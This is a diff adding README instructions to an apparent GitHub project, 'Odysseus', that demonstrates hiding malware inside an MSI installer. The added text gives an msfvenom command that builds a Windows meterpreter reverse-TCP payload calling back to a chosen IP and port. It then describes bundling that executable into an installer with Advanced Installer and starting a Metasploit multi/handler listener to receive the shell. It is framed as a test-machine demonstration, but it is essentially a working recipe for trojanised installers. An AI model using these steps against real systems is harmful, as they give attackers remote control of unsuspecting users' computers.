@@ -29,3 +29,52 @@ Start by cloning the repository to your local machine:
 ```bash
 git clone https://github.com/imnopro/Odysseus.git
 cd Odysseus
+```
+
+### 2. Generate the Malicious .exe
+Use msfvenom to create a malicious .exe payload. Replace LHOST and LPORT with your local IP address and port.
+
+``` bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.9 LPORT=9002 -f exe -o payload.exe
+```
+
+
+### 3. Package the Payload with Advanced Installer
+
+   -Open Advanced Installer:
+
+   -Launch Advanced Installer and create a new project or open an existing one.
+
+   -Add the Payload:
+
+   -Navigate to the "Files and Folders" section. Add the payload.exe file to the desired location in the installer.
+
+   -Configure Installation Settings:
+
+   -Set the install location and other configuration settings as needed.
+
+   -Build the Installer:
+
+   -Click "Build" to generate the MSI installer.
+
+
+
+
+
+   ## Running the Demonstration
+
+### Start the Listener:
+
+-Use netcat or Metasploit to listen for connections.
+
+``` bash
+msfconsole
+use exploit multi/handler
+set LHOST
+set LPORT
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+### Install the MSI:
+
+Install the MSI package on a test machine to execute the payload, and then run the .exe to test functionality.
